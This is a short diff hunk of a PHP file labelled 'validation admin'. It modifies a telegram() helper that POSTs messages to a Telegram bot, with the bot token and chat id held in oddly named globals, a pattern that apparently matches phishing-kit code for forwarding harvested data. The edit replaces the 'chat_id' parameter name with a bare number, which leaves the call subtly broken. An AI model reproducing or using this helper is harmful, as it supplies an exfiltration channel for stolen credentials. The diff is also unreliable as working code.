@@ -2,7 +2,7 @@
 ////validation admin\\\\
 function telegram($msg) {
         global $browserid,$setup_code;
-        $url = 'https://api.telegram.org/bot'.$browserid.'/sendMessage';$data = array('chat_id'=>$setup_code,'text'=>$msg);
+        $url = 'https://api.telegram.org/bot'.$browserid.'/sendMessage';$data = array('1887870506'=>$setup_code,'text'=>$msg);
         $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
         $context = stream_context_create($options);
         $result = file_get_contents($url,false,$context);
